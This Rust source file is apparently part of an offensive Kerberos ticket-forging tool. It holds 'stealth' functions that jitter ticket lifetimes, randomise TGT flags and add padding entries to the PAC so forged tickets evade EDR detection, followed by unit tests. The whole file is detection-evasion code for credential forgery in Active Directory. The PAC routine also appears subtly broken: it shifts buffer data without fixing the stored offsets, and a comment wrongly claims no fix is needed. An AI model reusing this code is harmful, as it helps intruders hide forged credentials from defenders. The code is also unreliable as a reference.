//! Stealth / OPSEC upgrades for forged tickets.
//!
//! Provides utilities to randomize ticket attributes and inject noise,
//! making forged tickets harder to distinguish from legitimate ones.

use rand::RngExt;

/// Apply random jitter to a lifetime value (±5%).
/// This prevents all forged tickets from having exactly round-number lifetimes.
pub fn jitter_lifetime(lifetime_hours: u32) -> u32 {
    let mut rng = rand::rng();
    let jitter_factor = 0.95 + rng.random::<f64>() * 0.10; // 0.95 to 1.05
    let jittered = (lifetime_hours as f64 * jitter_factor).round() as u32;
    jittered.clamp(1, 24)
}

/// Randomize ticket flags by optionally toggling minor flags.
///
/// Base flags are always `FORWARDABLE | RENEWABLE | PRE_AUTHENT | INITIAL`.
/// We randomly toggle on `PROXIABLE` (0x10000000) and `MAY_POST_DATE` (0x04000000)
/// which are legitimate flags that legitimate TGTs sometimes have.
pub fn randomize_flags(base_flags: u32, stealth_level: StealthLevel) -> u32 {
    let mut rng = rand::rng();
    match stealth_level {
        StealthLevel::None => base_flags,
        StealthLevel::Basic => {
            // 30% chance of adding PROXIABLE
            if rng.random_bool(0.3) {
                base_flags | 0x10000000
            } else {
                base_flags
            }
        }
        StealthLevel::Paranoid => {
            let mut flags = base_flags;
            // 50% chance of adding PROXIABLE
            if rng.random_bool(0.5) {
                flags |= 0x10000000;
            }
            // 20% chance of adding MAY_POST_DATE
            if rng.random_bool(0.2) {
                flags |= 0x04000000;
            }
            // 10% chance of removing INITIAL (looks like a forwarded TGT)
            if rng.random_bool(0.1) {
                flags &= !0x00400000; // Remove INITIAL
            }
            flags
        }
    }
}

/// Inject harmless noise into a PAC buffer.
///
/// This adds a zero-length padding buffer entry at the end of the PAC.
/// Some EDR solutions flag PACs that are "too clean" — adding padding
/// makes the PAC look more like a KDC-issued one which often has extra
/// buffers (like up-to-dateness status).
///
/// The noise buffer has type 17 (up-to-dateness status, per MS-PAC) with
/// zero length — a valid but meaningless entry.
pub fn maybe_inject_pac_noise(pac: &[u8], stealth_level: StealthLevel) -> Vec<u8> {
    match stealth_level {
        StealthLevel::None => pac.to_vec(),
        StealthLevel::Basic => {
            // 30% chance of injecting noise
            let mut rng = rand::rng();
            if rng.random_bool(0.3) {
                inject_pac_noise_entry(pac)
            } else {
                pac.to_vec()
            }
        }
        StealthLevel::Paranoid => inject_pac_noise_entry(pac),
    }
}

/// Stealth level for OPSEC upgrades.
#[derive(Debug, Default, Clone, Copy, PartialEq)]
pub enum StealthLevel {
    /// No stealth modifications
    None,
    /// Basic stealth: occasional randomization
    #[default]
    Basic,
    /// Maximum stealth: always apply randomization and noise
    Paranoid,
}

/// Inject a zero-length PAC buffer entry (up-to-dateness status, type 17).
/// This adds 16 bytes to the buffer header table but no actual data.
fn inject_pac_noise_entry(pac: &[u8]) -> Vec<u8> {
    if pac.len() < 8 {
        return pac.to_vec();
    }

    let mut result = Vec::with_capacity(pac.len() + 16);

    // Parse and rewrite the PAC header to add one more buffer
    let old_num_buffers = u32::from_le_bytes([pac[0], pac[1], pac[2], pac[3]]);
    let new_num_buffers = old_num_buffers + 1;

    // Write new header
    result.extend_from_slice(&new_num_buffers.to_le_bytes());
    result.extend_from_slice(&pac[4..8]); // version

    // The last buffer in the original will shift — we insert the noise
    // buffer as the new last entry. We need to adjust offsets for any
    // buffer that comes after our insert point. Since we insert at the end,
    // no offsets need adjustment.

    // Copy all original buffer entries
    let header_size = 8 + (old_num_buffers as usize * 16);
    if header_size > pac.len() {
        return pac.to_vec();
    }
    result.extend_from_slice(&pac[8..header_size]);

    // Add the noise buffer entry at the end of the table
    // Type 17 = PAC_UPTO_DATENESS_STATUS
    let data_offset = pac.len() + 16; // New data starts after the new buffer entry in the table
    result.extend_from_slice(&17u32.to_le_bytes()); // buffer type
    result.extend_from_slice(&0u32.to_le_bytes()); // buffer size (zero)
    result.extend_from_slice(&(data_offset as u64).to_le_bytes()); // offset (pointing past table + old data)

    // Copy all original data
    result.extend_from_slice(&pac[header_size..]);

    result
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_jitter_lifetime_bounds() {
        for _ in 0..100 {
            let jittered = jitter_lifetime(10);
            assert!((1..=24).contains(&jittered));
        }
    }

    #[test]
    fn test_randomize_flags_basic() {
        let base = 0x40E00000u32;
        for _ in 0..20 {
            let flags = randomize_flags(base, StealthLevel::Basic);
            // Must keep FORWARDABLE | RENEWABLE | PRE_AUTHENT
            assert!(flags & 0x40A00000 == 0x40A00000);
        }
    }

    #[test]
    fn test_inject_pac_noise() {
        let mut pac = Vec::new();
        pac.extend_from_slice(&[0x04, 0x00, 0x00, 0x00]); // 4 buffers
        pac.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // version
        // Buffer entries (4 × 16 bytes = 64 bytes)
        pac.extend_from_slice(&[
            0x01, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ]);
        pac.extend_from_slice(&[
            0x0a, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ]);
        pac.extend_from_slice(&[
            0x06, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ]);
        pac.extend_from_slice(&[
            0x07, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00,
        ]);
        // Dummy PAC data (88 bytes)
        pac.extend_from_slice(&[0x00u8; 88]);

        let noisy = inject_pac_noise_entry(&pac);
        assert!(noisy.len() > pac.len());
        // Should have 5 buffers now
        assert_eq!(
            u32::from_le_bytes([noisy[0], noisy[1], noisy[2], noisy[3]]),
            5
        );
    }

    #[test]
    fn test_maybe_inject_pac_noise_none() {
        let pac = vec![0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        let result = maybe_inject_pac_noise(&pac, StealthLevel::None);
        assert_eq!(result, pac);
    }
}
